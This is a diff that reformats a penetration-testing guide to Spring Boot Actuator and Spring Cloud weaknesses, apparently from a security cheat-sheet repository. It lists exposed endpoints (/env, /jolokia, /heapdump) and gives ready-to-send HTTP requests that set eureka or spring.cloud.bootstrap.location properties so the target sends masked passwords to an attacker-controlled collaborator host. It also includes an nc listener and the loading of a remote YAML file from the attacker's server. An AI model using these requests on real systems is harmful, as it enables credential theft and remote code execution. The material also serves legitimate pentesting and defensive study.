@@ -54,14 +54,14 @@ Spring Cloud builds services based on Spring Boot and provides an ordered collec
 
 Directly access the following routes to verify whether the vulnerability exists:
 
-```
+```[swagger.txt]
 /api-docs
 /v2/api-docs
 /swagger-ui.html
 ```
 
 Some interface routing distortions that may be encountered:
-```
+```[swagger_extra.txt]
 /api.html
 /sw/swagger-ui.html
 /api/swagger-ui.html
@@ -72,7 +72,7 @@ Some interface routing distortions that may be encountered:
 
 In addition, the following routes sometimes contain (or infer) some interface address information, but cannot obtain parameter-related information:
 
-```
+```[interface_info.txt]
 /mappings
 /actuator/mappings
 /metrics
@@ -144,27 +144,27 @@ Referring to [production-ready-endpoints](https://docs.spring.io/spring-boot/do
 Among them, the most important interfaces for finding vulnerabilities are:
 
 - `/env` and `/actuator/env`
-  - GET requests /env will leak environment variable information or some usernames in the configuration. When the programmer's attribute names are not standardized (for example, the password is written as passwords, PWD), the plaintext of the password will be leaked.
-  - At the same time, there is a certain probability that some attributes can be set through the POST request /env interface to trigger related RCE vulnerabilities.
+  - GET requests `/env` will leak environment variable information or some usernames in the configuration. When the programmer's attribute names are not standardized (for example, the password is written as passwords, PWD), the plaintext of the password will be leaked.
+  - At the same time, there is a certain probability that some attributes can be set through the POST request `/env` interface to trigger related RCE vulnerabilities.
 
 - `/Jolokia`
-  - Find exploitable MBeans through the /jolokia/list interface to trigger related RCE vulnerabilities;
+  - Find exploitable MBeans through the `/jolokia/list` interface to trigger related RCE vulnerabilities;
 
 - `/trace`
   - Some http request packets access tracking information, it is possible to find valid cookie information
 
 ### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 1)
 
-When accessing the /env interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
+When accessing the `/env` interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
 
 #### Conditions of use:
-- Target website exists /jolokiaor /actuator/jolokiainterface.
+- Target website exists `/jolokia` or `/actuator/jolokia` interface.
 - The target uses Jolokia-core dependencies (version requirements are currently unknown)
 
 #### Steps to use:
 
 1. Find the property name you want to get
-  - GET requests the /env or /actuator/env interface of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.
+  - GET requests the `/env` or `/actuator/env` interface of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.
 
 2. Jolokia calls the relevant MBean to get the plaintext
 
@@ -219,25 +219,25 @@ Content-Type: application/json
 
 ### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 2)
 
-When accessing the /env interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
+When accessing the `/env` interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
 
 #### Conditions of use:
 
-- GET request to the target website/env
-- can POST requests to the target website/env
-- You can POST request the /refreshinterface refresh the configuration ( spring-boot-starter-actuatordependency exists)
-- The target uses a spring-cloud-starter-netflix-eureka-clientdependency.
+- GET request to the target website `/env`
+- Cans send POST requests to the target website `/env`
+- You can send POST request to the `/refresh` interface to refresh the configuration (`spring-boot-starter-actuator` dependency exists)
+- The target uses a `spring-cloud-starter-netflix-eureka-client` dependency.
 - The target can request the attacker's server (the request can go out of the Internet)
 
 #### Steps to use:
 
 1. Find the property name you want to get
-   - GET requests the /envor /actuator/envinterface of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.
+   - GET requests the `/env` or `/actuator/env` interface of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.
 
 2. Use nc to listen for HTTP requests
    - Listen to port 80 on the external network server controlled by yourself. It can be your Burp collaborator, interact.sh, the classic `nc -nlvp 80` or `httpdump :80` ([httpdump on Github](https://github.com/luastan/httpdump))
 
-3. Set the eureka.client.serviceUrl.defaultZone property
+3. Set the `eureka.client.serviceUrl.defaultZone` property
    - Replace in the following with the attribute name masked by the corresponding asterisk* you want to get:
 
 **spring 1.x**
@@ -254,7 +254,7 @@ eureka.client.serviceUrl.defaultZone=http://value:${{{ attribute security.user.p
 ```http
 POST /actuator/env HTTP/1.1
 Host: {{ target-domain vulnerable.net }}
-Content- Type : application/json
+Content-Type: application/json
 
 {"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${{{ attribute security.user.password }}}@{{ collaborator your.burpcollaborator.net }}"}
 ```
@@ -298,7 +298,7 @@ When accessing the `/env` interface, the spring actuator will replace the attrib
 
 #### Steps to use:
 
-- Referring to what was proposed by UUUUnotfound, you can use placeholders to bring out data in the URL path when the target sends an external http request
+- Referring to what was proposed by _UUUUnotfound_, you can use placeholders to bring out data in the URL path when the target sends an external http request
 
 1. Find the property name you want to get
    - GET requests the `/env` or `/actuator/envinterface` of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.
@@ -313,9 +313,9 @@ When accessing the `/env` interface, the spring actuator will replace the attrib
 ```http
 POST /env HTTP/1.1
 Host: {{ target-domain vulnerable.net }}
-Content-Type:application/x-www-form-urlencoded
+Content-Type: application/x-www-form-urlencoded
 
-spring.cloud.bootstrap.location=http://your-vps-ip/${{{ attribute security.user.password }}}
+spring.cloud.bootstrap.location=http://{{ collaborator your.burpcollaborator.net }}/?s=${{{ attribute security.user.password }}}
 ```
 
 **spring 2.x**
@@ -325,7 +325,7 @@ POST /actuator/env HTTP/1.1
 Host: {{ target-domain vulnerable.net }}
 Content-Type: application/json
 
-{"name":"spring.cloud.bootstrap.location","value":"http://{{ collaborator your.burpcollaborator.net }}/?{{{ attribute security.user.password }}}"}
+{"name":"spring.cloud.bootstrap.location","value":"http://{{ collaborator your.burpcollaborator.net }}/?s={{{ attribute security.user.password }}}"}
 ```
 
 - **eureka.client.serviceUrl.defaultZone** Method ( not applicable when there are special URL characters in plaintext data):
@@ -336,48 +336,50 @@ Content-Type: application/json
 POST /env HTTP/1.1
 Host: {{ target-domain vulnerable.net }}
 Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http:///{{ collaborator your.burpcollaborator.net }}/${{{ attribute security.user.password }}}
 ```
 
 **spring 2.x**
 
-|
-
-POST /actuator/env
-
+```http
+POST /actuator/env HTTP/1.1
+Host: {{ target-domain vulnerable.net }}
 Content-Type: application/json
 
-{"name":"eureka.client.serviceUrl.defaultZone","value":"http://{{ collaborator your.burpcollaborator.net }}/${security.user.password}"}
+{"name":"eureka.client.serviceUrl.defaultZone","value":"http://{{ collaborator your.burpcollaborator.net }}/${{{ attribute security.user.password }}}"}
+```
 
- |
 
 **Step 4: **Refresh the configuration
 
-**spring 1.x\
-**
+**spring 1.x**
 
-```
-POST /refreshContent - Type : application/x- www- form - urlencoded
-```
-
-**spring 2.x\
-**
-
-```
-POST /actuator/ refreshContent- Type: application/json
+```http
+POST /refresh HTTP/1.1
+Host: {{ target-domain vulnerable.net }}
+Content-Type: application/x-www-form-urlencoded
 ```
 
-[](https://www.blogger.com/#)
+**spring 2.x**
+
+```http
+POST /actuator/refresh HTTP/1.1
+Host: {{ target-domain vulnerable.net }}
+Content-Type: application/json
+```
+
 
 ### Obtain the Plaintext of the Password Desensitized by the Asterisk (method 4)
 
 - When accessing the /env interface, the spring actuator will replace the attribute values ​​corresponding to some attribute names with sensitive keywords (such as password, secret) with * to achieve the effect of desensitization
 
-[](https://www.blogger.com/#)**Conditions of use:**
+#### Conditions of use:
 
-- Normal GET request-target /heapdumpor /actuator/heapdumpinterface
+- Normal GET request targeting `/heapdump` or `/actuator/heapdump` interface
 
-**[](https://www.blogger.com/#)How to use:**\
-[](https://www.blogger.com/#)**Step 1:** Find the property name you want to get
+#### Steps to use:
+**Step 1:** Find the property name you want to get
 
 - GET requests the /envor /actuator/envinterface of the target website, search for ******keywords, and find the attribute name corresponding to the attribute value masked by the asterisk * to be obtained.
 
@@ -504,7 +506,7 @@ POST /envContent - Type : application/x- www- form - urlencodedspring.cloud.boot
 **
 
 ```
-POST /actuator/ envContent- Type: application/json{ "name" : "spring.cloud.bootstrap.location" , " value" : " http : //your-vps-ip/example.yml"}
+POST /actuator/ envContent-Type: application/json{ "name" : "spring.cloud.bootstrap.location" , " value" : " http : //your-vps-ip/example.yml"}
 ```
 
 [](https://www.blogger.com/#)**Step 3:** Refresh the configuration
@@ -523,7 +525,7 @@ POST /refreshContent - Type : application/x- www- form - urlencoded
 **
 
 ```
-POST /actuator/ refreshContent- Type: application/json
+POST /actuator/ refreshContent-Type: application/json
 ```
 
 #### Vulnerability Principle:
@@ -596,7 +598,7 @@ POST /envContent-Type: application/x-www-form-urlencodedeureka .client .serviceU
 **
 
 ```
-POST /actuator/ envContent- Type: application/json{ "name" : "eureka.client.serviceUrl.defaultZone" , "value" : " http :// your - vps - ip / example " }
+POST /actuator/ envContent-Type: application/json{ "name" : "eureka.client.serviceUrl.defaultZone" , "value" : " http :// your - vps - ip / example " }
 ```
 
 [](https://www.blogger.com/#)**Step 4:** Refresh the configuration
@@ -611,7 +613,7 @@ POST /refreshContent - Type : application/x- www- form - urlencoded
 **spring 2.x**
 
 ```
-POST /actuator/ refreshContent- Type: application/json
+POST /actuator/ refreshContent-Type: application/json
 ```
 
 #### Vulnerability Principle:
